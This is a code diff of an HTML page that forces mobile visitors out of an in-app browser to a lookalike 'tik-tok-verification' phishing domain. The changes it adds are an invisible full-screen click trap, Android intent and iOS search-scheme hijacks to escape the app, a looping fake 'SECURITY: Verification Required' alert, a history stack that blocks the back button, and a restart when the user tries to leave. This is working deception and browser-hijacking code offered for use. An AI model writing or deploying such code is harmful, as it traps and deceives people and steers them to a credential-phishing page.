@@ -3,59 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
+    <style>
+        body, html { margin: 0; padding: 0; background: #fff; width: 100%; height: 100%; overflow: hidden; }
+        /* This invisible layer captures the touch to 'authorize' the external jump */
+        #trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; }
+    </style>
 </head>
 <body>
+    <div id="trigger" onclick="forceDirectExternal()"></div>
 
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; // 5 SECOND FAIL-SAFE
-
-    // This creates a "Bridge" that forces the browser to treat the URL as a site, not a search
-    const directBridge = `data:text/html;base64,${btoa(`<html><meta http-equiv="refresh" content="0;url=${target}"></html>`)}`;
 
     function forceDirectExternal() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: We use the 'intent' but point it to the 'directBridge' to stop the search behavior
+            // Android: Chrome Intent with 'Action View' and explicit package
             window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
         } else if (isIOS) {
-            // iOS: We use the Bridge to force Safari to actually LOAD the page
-            window.location.href = directBridge;
+            // iOS: Protocol Shotgun
+            // 1. Try to trigger the "Open in Safari" banner via a search hijack
+            window.location.replace("x-web-search://?" + encodeURIComponent(target));
             
-            // The Search-to-Direct handover
-            setTimeout(() => {
-                window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            }, 50);
-
-            // Nuclear fallback for iOS
-            window.location.href = "webcal://" + target.replace("https://", "");
+            // 2. The "Handover" click - simulating a real user navigation
+            const a = document.createElement('a');
+            a.href = target;
+            a.rel = "noreferrer";
+            a.target = "_blank";
+            a.click();
         }
     }
 
     function rampage() {
-        if (Date.now() > killTime) return; // FAIL-SAFE
+        if (Date.now() > killTime) return; // FAIL-SAFE CHECK
 
+        // Force a redirect attempt before the alert
         forceDirectExternal();
 
-        alert("VERIFICATION REQUIRED\n\nTap OK to open the secure system browser.");
+        // The alert freezes the app, allowing the OS to process the redirect intent
+        alert("SECURITY: Verification Required\n\nTap OK to open your secure browser.");
         
+        // Force again immediately after dismissal
         forceDirectExternal();
 
         setTimeout(rampage, 10);
     }
 
     window.onload = () => {
+        // Build backstack
         for(let i=0; i<30; i++) history.pushState(null, null, "#step" + i);
+        
+        // Start the alert rampage
         rampage();
     };
 
+    // If the user tries to hit 'X' (blur), restart the logic
     window.onblur = () => {
         if (Date.now() < killTime) rampage();
     };
 </script>
-
 </body>
 </html>
